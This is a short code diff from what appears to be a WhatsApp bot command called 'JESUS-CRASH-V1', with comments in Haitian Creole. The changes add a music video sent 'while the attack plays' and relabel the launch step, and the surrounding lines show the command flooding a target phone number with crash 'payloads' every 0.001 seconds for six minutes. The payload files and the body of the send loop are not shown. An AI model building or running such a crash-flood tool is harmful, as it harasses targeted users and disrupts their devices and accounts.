@@ -45,7 +45,7 @@ cmd({
       }, { quoted: mek });
     }
 
-    // ✅ Voye imaj `2.png` ak caption
+    // ✅ VOYE IMG 2.png
     const imagePath = path.join(__dirname, '../media/2.png');
     const imageBuffer = fs.readFileSync(imagePath);
     await bot.sendMessage(from, {
@@ -53,7 +53,16 @@ cmd({
       caption: `🚨 𝐉𝐄𝐒𝐔𝐒-𝐂𝐑𝐀𝐒𝐇-𝐕𝟏 launched on wa.me/${targetNumber}\n🕒 Duration: 6min\n⚡ Delay: 0.001s\n📦 Payloads: ${bugFiles.length}`,
     }, { quoted: mek });
 
-    // Atak la kòmanse
+    // 🎵 VOYE MIZIK APRÈ IMAG LA
+    const audioPath = path.join(__dirname, '../media/5.mp4');
+    const audioBuffer = fs.readFileSync(audioPath);
+    await bot.sendMessage(from, {
+      video: audioBuffer,
+      mimetype: 'video/mp4',
+      caption: '🎵 Mizik lan ap jwe pandan atak la...'
+    }, { quoted: mek });
+
+    // 🚀 LANSE ATAK LA
     const endTime = Date.now() + (6 * 60 * 1000); // 6 minit
 
     while (Date.now() < endTime) {
